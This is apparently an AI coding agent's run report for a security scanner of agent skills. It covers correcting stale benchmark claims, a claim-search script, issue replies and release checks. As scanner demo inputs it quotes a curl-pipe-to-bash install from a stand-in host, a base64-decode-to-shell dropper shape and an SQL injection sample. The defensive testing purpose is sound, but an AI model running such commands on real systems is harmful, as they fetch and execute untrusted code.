# RUN 9 REPORT

Target confidentiality: the audit target is referred to only as "the audit target". No
target path, repository name or source excerpt appears in this file, in the ledger, in any
fixture, or in any commit message.

W44 through W47 are complete. **Every mechanical gap before v0.20.0 is closed. What remains
is six decisions, and all six are Heady's.** They are in § 6, ordered, with the first one
gating three of the others.

---

## 0. The headline: the catalogue of wrong numbers was itself incomplete, and a script found what two sessions of reading did not

RUN6 catalogued the locations of the drifted F1 family by hand: nine rows in
`CLAIMS_RECONCILIATION.md` § 2, then twenty-one rows in `METRICS_RETRACTION.md` § 2. RUN8
corrected eighteen surfaces and wrote a test to hold the rule count in place. Both documents
present their tables as complete — "**Every location the affected figures appear**" is the
literal heading of § 2.

W45 built `scripts/scan_external_claims.sh` for a different purpose: to give Heady a way to
search a paper and a slide deck. Run once against this repository, it took under a second to
find a twenty-second location that neither table contains:

```
F1-0.778 [UPDATE]      ./docs/COMPETITIVE-COMPARISON.md:9
      | **agent-audit** (v0.19.0, raw, reproducible) | **82.63%** | **73.58%** | **0.778** |
```

**A competitive comparison table, against Bandit and Semgrep by name.** Of every surface in
the repository, it is the worst place for a superseded number, because the number is being
used to make a claim about someone else's tool as well as our own.

Two things make it more than a missed line.

**It was certified as corrected by another document.** `docs/F1_REPRODUCTION.md:7` reads:

> The current **headline F1 = 0.7581** (raw, reproducible, v0.20.0) used in `README.md`,
> `README_CN.md`, `COMPETITIVE-COMPARISON.md`, `BENCHMARK-RESULTS.md`, `CLAUDE.md`, and
> `docs/index.html` …

Five of those six were true. The sixth was a list entry nobody checked against the file it
named — which is the same defect as a rule count on six pages that agree with each other and
not with the rule set, one level up. **A claim about which claims are correct is still a
claim, and it drifts the same way.**

**And it also carried a wrong corpus size** — "81 samples / 218 labels", where the corpus has
238. The same 218 was in `docs/BENCHMARK-RESULTS.md:7`, in a sentence whose other figures had
all been corrected to v0.20.0 values. The correction pass updated the metrics in that sentence
and left the denominator they were measured over.

This is the eighth instance of the pattern RUN8 named as a question — *if this mechanism
silently stopped working, what would be different?* — with "the mechanism" being **human
review of a document set**. The answer, measured: two sessions of careful manual cataloguing
missed one location in twenty-two, and it stayed missed through a correction pass that
explicitly listed it as done.

Both are fixed. `docs/COMPETITIVE-COMPARISON.md` now carries the measured values, the causal
note, the bound, a fourth column stating that the agent-audit row and the two baseline rows
were measured on **different sample sets**, and a dated correction note saying how it was
missed.

---

## 1. W44 — the fifth number, in three files rather than two

`DECISIONS.md` item 44 recorded `blog_post.md` and `twitter_thread.md` publishing **56
rules**. `chinese_summary.md` sits beside them, is equally untracked, and carries the same
scan figures, the same 80% precision and the same `1322` test count — in the one language
nobody would think to grep. It is now in scope and corrected.

**56 is not a stale count. It is an unattributable one.** The known set is 66; the history is
72, 92, 63, 53, 52, 49, 40+. 56 is none of them, at any commit.

### What the drafts actually had wrong, in order of severity

1. **The evidentiary base is not in the repository.** Everything the post asserts —
   13,355 findings, 1,492 BLOCK, 4.5% of skills, the 46.6%/16.8% split, the per-rule hit
   counts, the OWASP trigger table — comes from one 18,899-skill ClawHub scan whose data is
   not committed anywhere. `grep` for its totals across the tree returns the drafts and the
   documents that flag them, nothing else.

2. **And the scanner that produced it no longer exists.** v0.20.0 withdrew six rules that
   could never fire, gated AGENT-034 on a tool boundary, and narrowed AGENT-004. AGENT-034
   alone is 3,129 of the draft's own 18,294 rule triggers. **A re-run would not return these
   numbers.** Publishing them beside a v0.20.0 announcement attributes one scanner's output
   to a different scanner — the shape of the 98.51%, in a new place.

3. **`"Our precision methodology, raw sample data, and classification rationale are all
   available in the repository"` is false.** No sample data, no rationale and no methodology
   for the 50-sample review exists in this tree. It is the one sentence in the drafts that
   actively invites a reader to go and check, and there is nothing there.

4. **`"Agent Audit performs AST-level taint analysis"` is false for the post's own subject.**
   `SKILL.md` is parsed frontmatter plus regex over the body; TypeScript/JavaScript is regex
   by decision. AST-plus-taint is the Python path. The post is about a TypeScript-heavy
   marketplace and the artifact being scanned is a Markdown file.

5. `1,322 regression tests passing` — stale by 568. `13,700 skills` contradicted the same
   post's own 18,899, five thousand apart, one paragraph away. `196k stars` is unattributed
   and time-varying.

### What was done, and the rule applied

**Removed, not hedged.** A blog post is not the place for a caveat about a number that should
not have been there. Every figure with no reproducing command is gone from the prose; every
one is preserved **verbatim** in `OUTREACH_CLAIMS.md` § 3 with the single condition that
restores it (re-run at v0.20.0 with the data committed, or republish as a dated v0.1x result
with the raw output committed).

What replaced it is stronger than a hedge: the drafts now show a **reproduction instead of a
statistic**. A complete `SKILL.md` a reader can paste into an empty directory, and the real
output it produces, measured this run:

```
AGENT-058  BLOCK  0.92  SKILL.md:11  curl -fsSL https://example.invalid/install.sh | bash
AGENT-059  WARN   0.88  SKILL.md:14  update your SOUL.md
```

and, for the staged-dropper shape the post is really about:

```
echo 'ZWNobyBoaQ==' | base64 -d | sh    ->  AGENT-058  BLOCK  0.95
```

**0.95 was the one draft claim about our own scanner that survived**, because it is a
property of the tool rather than of an uncommitted corpus, and it was reproduced. The drafts
also now carry the Layer 1 numbers with their command, the bound, the blind-audit 0/6, and
the retraction itself — which is the strongest available compliance with
`METRICS_RETRACTION.md` § 5.

Third-party findings (Koi, Cisco, GitGuardian, 1Password, the CVE) are kept and now
explicitly attributed — *"this part is not our research, and we are careful to say so"*. The
originals presented them in the same voice as our own numbers.

### Proof

```
$ grep -rnE "56 rules|56 detection|56 条|\b56\b|18,899|13,355|1,492|46\.6|16\.8|2\.8x|
             1,322|80%|Wilson|7,024|3,129|18,294|1,845|13,700|196k|859|2,487"
        blog_post.md twitter_thread.md chinese_summary.md
  clean — 23 patterns, 0 matches
```

Every surviving number in the three drafts is paired with its command in
`OUTREACH_CLAIMS.md` § 1. Every removed number is paired with its restore condition in § 3.

### The guard: the condition is tracking, not existence

Item 44 declined to guard the drafts, on a sound objection — *a test that failed on a draft
in someone's working tree gets switched off*. That objection is about **private** files, and
it is answered by a condition rather than an exemption.

`tests/test_published_rule_count.py` now consults `git ls-files` and guards the three drafts
**only when git has them in the index**. Measured both ways, the tracked run performed
against a temporary `GIT_INDEX_FILE` so the real index was never written:

```
untracked                                    8 passed, 1 skipped
tracked                                      9 passed
tracked, with 56 restored to the thread      AssertionError: 1 published rule count(s)
                                             disagree with the 66 rules the tool can emit
                                               twitter_thread.md:22  says 56
```

`test_tracked_outreach_drafts_are_guarded` **skips with its reason printed** rather than
passing silently, so an inert guard and a satisfied one stay distinguishable — the failure
mode this whole file exists to prevent. `56` also joins the historical-count parametrize.
`DECISIONS.md` item 45.

**What it does not cover, stated rather than implied:** a draft published without ever being
committed. The guard checks the repository, not the clipboard. The non-rendering HTML hold at
the top of each draft is a convention, not a mechanism.

---

## 2. W45 — the search kit

Three artifacts, and the design decision worth recording is the third.

**`scripts/scan_external_claims.sh`** — 35 patterns over every numeric form each retracted
and drifted figure takes, each tagged with the **class of correction** it needs, because the
class decides what you write:

| class | meaning | what you write |
|---|---|---|
| `RETRACT` | never a measurement | withdraw with the mechanism stated; there is nothing to update *to* |
| `UPDATE` | a real measurement that drifted | restate **with** the causal note, or it reads as a regression that did not happen |
| `UNSUB` | no data in the repository | commit the data or cut the claim |
| `COUNT` | stale count | substitute |

`--list` prints the whole table with the current value for each. Reads only; never writes,
edits or uploads.

**It opens binary formats, and that is where the risk actually is.** A preprint PDF and a
`.pptx` deck are the two most likely carriers of a retracted figure, and plain `grep` is
blind to both. PDFs go through `pdftotext` when poppler is installed; Office files are
unzipped and searched as XML; Keynote/Pages/Numbers are **listed by name under NOT SEARCHED**
rather than silently skipped, because a scan that reports nothing and a scan that could not
read the file must not look the same. That is `CAPABILITY_BOUNDARIES.md` § 3 applied to the
tool built to fix a § 3 problem.

**`scripts/external_claims_allowlist.txt`** — the documents whose job is to quote the wrong
numbers, so an in-repo scan reports surfaces rather than records. **I got this wrong on the
first attempt** and it is worth recording: my first version allowlisted
`docs/BENCHMARK-RESULTS.md` and `docs/F1_REPRODUCTION.md` as "results files", which would
have hidden exactly the class of surface the scan exists to find — and `F1_REPRODUCTION.md`
is the file whose entire subject is verifiability. Removing them is what surfaced
`COMPETITIVE-COMPARISON.md` in the neighbouring directory. The file now carries the rule as a
comment: *if you find yourself adding a README, stop — that is the surface, not the record.*

**`EXTERNAL_CLAIMS_CHECKLIST.md`** — seven destinations, each with what to search for and
what the corrected value is, so a correction is a substitution. The three rows that are not
obvious:

* **arXiv** — a v1 cannot be edited, only superseded. If a retracted figure is in a v1, the
  correction is a **v2 with a change note**, which is a different piece of writing from an
  edit to a working draft. Decide which before touching the source.
* **PyPI** — the correction is not retroactive. Every already-published version keeps the
  description it was built with and PyPI renders each version's own page. Recommendation:
  leave the historical pages as the record they are; make sure `/latest/` is right.
* **A DOI** is the worst case, because it is designed to be permanent and citable. Zenodo's
  correction is a new version with its own DOI and a note that says *retraction*, not
  "updated results".

### Proof — the in-repo run

```
$ ./scripts/scan_external_claims.sh --allowlist scripts/external_claims_allowlist.txt .
26 match(es)
```

All 26 accounted for: eight are `docs/F1_REPRODUCTION.md`'s own retraction notes and its
disclosed adjusted-F1 derivation, three are the retraction paragraph in each corrected draft,
two are the correction note added to `COMPETITIVE-COMPARISON.md` this run quoting what it
replaced — **and one is a live item that is Heady's**: `README.md:147`, *"validated against
18,899 ClawHub skills at 80% precision"*, on a tracked, published surface.

That last one is the single exception to what RUN8 established. Every other in-repo metric is
now the measured value with the command beside it; this one has no command, and correcting it
means either committing the data or cutting the clause — which is a publishing decision, not
a mechanical one. § 6 item 2.

The three drafts are deliberately **not** allowlisted, so a reintroduced figure would still
show up.

---

## 3. W46 — the issue replies

`ISSUE_REPLIES.md`, one section per issue, complete comment bodies. Nothing posted; the guard
blocks `gh` writes and that is correct.

Every before/after was **re-run this session** rather than quoted from RUN8.

**#10 — close as fixed.** The reporter's shapes at HEAD produce two findings instead of
three; both true positives survive, including the upstream-SQL case a blunter fix would take.
The brief asked for the limitation to be stated plainly, so it is stated **as a measurement**
rather than as a warning — and measuring it made it narrower and more useful than the general
version:

```
zz.execute(f"SELECT * FROM users WHERE name = '{name}'")   ->  AGENT-041 BLOCK 1.0
zz.execute(query)                                          ->  nothing
cursor.execute(query)                                      ->  AGENT-041 BLOCK 1.0
```

The receiver requirement applies **only where the SQL is not visible at the call site**. So an
unusually-named cursor still gets the finding whenever the query is at the call site, and gets
silence when it was built upstream. The reply says so, quantifies the loss, and asks for the
name so the vocabulary can grow from reports rather than from imagination.

**#8 — reply, stays open.** Two of four fixed, one downgraded, one improved, with the
three-producers measurement written out as the reason the remaining complaint cannot be
answered per-producer. The reply says "two of four is not a closure" in those words.

**#12 — close as won't-fix, documented.** The differential is attached: 2 true positives lost,
8 findings added of which 6 are known false positives, 42 test regressions. The reply names
the one part of the report that is still unfixed and still wanted — the silent downgrade —
and says plainly that there is no good answer for it yet.

**#11 — reply, stays open. This reverses `ISSUE_TRIAGE.md`'s recommendation**, and the brief
asked for a judgement with a reason, so: the issue's *remedy* is dead, but its *subject* is
live. There is dead code in the tree whose coverage story is misleading, v0.20.0 has just
decided it stays dead, and deleting the branches is scheduled work in `NEXT_ROUND.md`.
Closing would discard the only tracker that work has, and a reader arriving from #12 would
find the follow-up missing. The reply offers to close it in favour of a fresh issue if the
reporter prefers — the objection is to losing it, not to its number.

**#5 — reply, label, stays open.** Deferred with the specific reason (it needs prompt
*extraction*, which #8's problem 3 is a live example of the tool getting wrong), the packaging
cost, and where it sits relative to v0.21.0's single scoped capability. The reply names the
half that would be taken as a PR.

---

## 4. W47 — the release evidence

Every command run from a clean tree at `bea9901`, CPython 3.14.3, this session.

| check | command | result |
|---|---|---|
| Layer 1 | `cd packages/audit && python3 ../../tests/benchmark/precision_recall.py` | **TP 199 / FP 90 / FN 37 · P 68.86% / R 84.32% / F1 75.81%**, over 238 labels in 81 files, 289 findings. exit 0 |
| quality gate | `python3 tests/benchmark/quality_gate_check.py --config tests/benchmark/gates.yaml` | **exit 0** — 0 failures, 0 warnings, **0 skipped**, 4 below aspirational target |
| gate provenance | `python3 tests/benchmark/provenance.py` | current: `git_rev bea9901`, `version 0.20.0`, `is_this_checkout: true` |
| full suite | `python3 -m pytest tests/ packages/audit/tests/ -q` | **1,891 passed, 1 failed, 4 skipped** — the failure is the corpus-label guard, red on purpose |
| suite, `tests/` only | `python3 -m pytest tests/ -q` | 1,859 passed, 1 failed, 4 skipped |
| AVB `knowns` | `cd tests/benchmark && python3 -m "agent-vuln-bench.harness.run_eval" --tool agent-audit --dataset knowns` | **R 100.0% / P 88.0% / F1 0.9362** — Set A/B/C all 100% |
| AVB `all` | same, `--dataset all` | **R 95.24% / P 86.96% / F1 0.9091**, TP 40 / FN 2 / FP 6 over 22 samples |
| advertised rules | `advertised_rules()` | **66** |
| versions | `pyproject.toml`, `version.py`, `__init__.py`, live import | **0.20.0** in all four |
| YAML rule sync | `diff rules/builtin/*.yaml` against the package copy | **6/6 in sync** |
| built wheel | `agent_audit-0.20.0-py3-none-any.whl` METADATA | `Summary: … 66 rules mapped to OWASP Agentic Top 10.` — the corrected PyPI description **is** in the artifact |
| wheel leakage | exclusion scan over 103 entries | **0** matching `eval/`, `ground_truth`, `labeled_samples`, `results/`, `NIGHT_RUN`, `DECISIONS`, `.claude/` |
| guard self-test | `bash .claude/hooks/test-guard.sh` | **11/11** |

**The AVB result is worth one more line than the table gives it.** `DECISIONS.md` item 40
records that AVB results carry no provenance stamp, so nothing can tell a current
`results/avb_results.json` from a stale one. The stamp is still not there — it is a change to
the AVB harness and remains item 40 — but this run closed the question *for this release* the
only other way available: re-running the harness and comparing. **Every metric field is
identical**; only `total_scan_time` and the `regression` block differ. The file the gate reads
is current, verified by content rather than by stamp.

### Four mechanical corrections found during the sweep

| what | where | fixed |
|---|---|---|
| the drifted F1 family, 22nd location | `docs/COMPETITIVE-COMPARISON.md` | yes — plus the different-sample-sets column and a dated correction note |
| corpus size 218, where it is 238 | `COMPETITIVE-COMPARISON.md`, `BENCHMARK-RESULTS.md:7` | yes |
| four stale test counts, and a fifth for a different command | `CLAUDE.md` ×2, `README.md` badge, `README_CN.md` badge, `README.md:388` | yes — `DECISIONS.md` item 46 |
| declared Python range | `CLAUDE.md:8` said 3.9–3.12; the package classifies through 3.14 and this branch is `fix/py314-blocker` | yes |

**The test-count one has a shape worth naming, and it then happened again inside this run.**
The four surfaces said 1,883 where the command they name produces 1,890, and the gap is
exactly seven — which is `tests/test_published_rule_count.py`, the seven-test guard RUN8
added in the same session that wrote 1,883. **The commit that fixed the rule count made the
test count wrong.**

Then, correcting them, I wrote 1,890 to all five surfaces — and the two tests this run adds
to that same file made 1,890 stale before the session ended. The final figure is **1,891**.
The defect reproduced itself inside the fix for it, which is about as clean a demonstration
as the point admits.

It is corrected and **deliberately not guarded**: a test asserting the suite's own size
increments that size, so every future test addition would fail the suite until someone edited
a number — an over-eager guard, which is the kind that gets switched off. The defence used
instead is the one that worked for the metrics: each count now names the command that
produces it. `DECISIONS.md` item 46 records the shape that *would* work if a mechanism is ever
wanted (assert consistency between surfaces, not a literal value), so the next person does not
have to rediscover why the obvious version is a trap.

---

## 5. What I did not do

**No push, merge, rebase, tag or publish. No oracle, dataset, ground-truth label, existing
fixture, confidence value, tier boundary or threshold modified.** No `gh` write of any kind.
No scanner detection logic changed — the only code edit this run is to
`tests/test_published_rule_count.py`.

**One thing I could not verify, stated rather than glossed.** The original drafts printed a
decoded payload for a base64 blob attributed to a live C2 host. This environment declined to
run a base64 decode of that string, which is the correct default, so **I did not confirm what
it decodes to** and the corrected drafts do not assert it. The demo uses an inert blob whose
only job is to make AGENT-058 fire at 0.95, which was reproduced. Recorded in
`OUTREACH_CLAIMS.md` § 1.

**Three guard denials, none bypassed**, all the same mechanism as RUN8's: a command
containing a protected path or `rm -rf` is refused whole even when the path is only being read
or a scratchpad directory is the target. Each was solved by rewriting the command — using a
fresh scratch directory instead of removing one, and dropping `eval/` from a `grep` path list.

---

## 6. The list

**Everything mechanical is done.** These six are decisions, and nothing in the repository can
make them. Item 1 gates items 2, 3 and 6.

| # | decision | why only you | cost if wrong |
|---|---|---|---|
| **1** | **Which external surfaces carry the retracted 98.51%** — run `scripts/scan_external_claims.sh` over your papers, decks and outreach archive, then work `EXTERNAL_CLAIMS_CHECKLIST.md` | I searched inside the repository only, by instruction. A paper, a slide, a sent message | This is the release blocker. `METRICS_RETRACTION.md` § 5: nothing new is published on top of a surface still carrying a retracted figure |
| **2** | **`README.md:147`** — "validated against 18,899 ClawHub skills at 80% precision". Commit the data, or cut the clause | Both are one-line edits with different meanings. Which one depends on whether the data exists to commit | It is the only metric on an in-repo surface with no reproducing command — the single exception to the standard this release set |
| **3** | **The ClawHub scan figures** — restore by re-running at v0.20.0, or republish as a dated v0.1x result with the raw output committed. `OUTREACH_CLAIMS.md` § 3 | You have the corpus and the original output; neither is in this tree | Route (a) makes them checkable. Route (b) is cheaper and honest if every figure carries its version and date. Publishing as-is is the one option ruled out |
| **4** | **The malware-campaign section** — publishing publisher account names and a C2 address | A disclosure decision with a coordination question attached (were the accounts reported to ClawHub, and when). No command answers it | Independent of 1–3 |
| **5** | **`RELEASE_CHECKLIST.md` steps 6–7** — merge, tag, publish; and post the five replies from `ISSUE_REPLIES.md` | The guard blocks all of it, correctly | Step 5 (rebuild) is verified done: the wheel carries the corrected description and is clean |
| **6** | **Whether the three drafts go out at all before item 1 closes** | They *cite* the retraction, which is the strongest compliance available — but the external surfaces still have to be found first | Each draft opens with a non-rendering hold saying exactly this |

Carried from RUN8, unchanged and not blocking: `DECISIONS.md` items 35, 36, 38, 39 rows 2–4
(ground-truth and rule-set decisions), item 40 (AVB provenance stamp — verified current by
re-run this session, still unstamped), item 41 (`git mv .agent-audit.yaml.bak`), item 43 (a
per-line producer view). `NEXT_ROUND.md` is v0.21.0 and needs no decision to start.

---

## 7. The through-line, nine runs on

RUN8 ended with a question to ask of any mechanism: *if this silently stopped working, what
would be different?* It applied the question to the gate, which was the last **instrument**
still trusted rather than checked.

This run applied it to the last thing that was not an instrument at all: **reading the
documents carefully.** Two sessions of manual cataloguing, presented under a heading that says
*every location*, missed one location in twenty-two — and the miss survived a correction pass
that listed the file by name as already done.

The three defects this run found are one defect:

* a competitive comparison publishing a superseded F1, listed as corrected by a neighbouring
  document;
* four surfaces publishing a test count that the commit fixing the rule count had made wrong;
* three drafts publishing a rule count that was never any set's size.

**Every one is a fact with several copies and no mechanism relating the copies to the fact** —
which is the sentence `tests/test_published_rule_count.py` opens with. The rule count got a
mechanism in RUN8 and has not drifted since. The test count and the claims catalogue did not,
and both drifted within one session.

So the lesson is narrower than "check things", and it has a cost attached that the run also
measured: **a guard is only worth building where it does not become the thing that gets
switched off.** The rule count is guardable because the number changes when the rules change.
The test count is not, because a guard on it fires on every legitimate addition — so it gets
a named command instead, and item 46 records the shape that would work if anyone ever wants
one. The claims catalogue could not be guarded by a test at all, so it got a script — and the
script found the twenty-second location on its first run, against a repository that two
sessions had already been through.

The general form, and it is the one thing worth carrying into v0.21.0:

> **Where a fact has copies, either relate the copies to the fact by machine, or give every
> copy the command that produces it. Doing neither is how all four of this release's wrong
> numbers survived, and doing the first one badly is how it gets undone.**
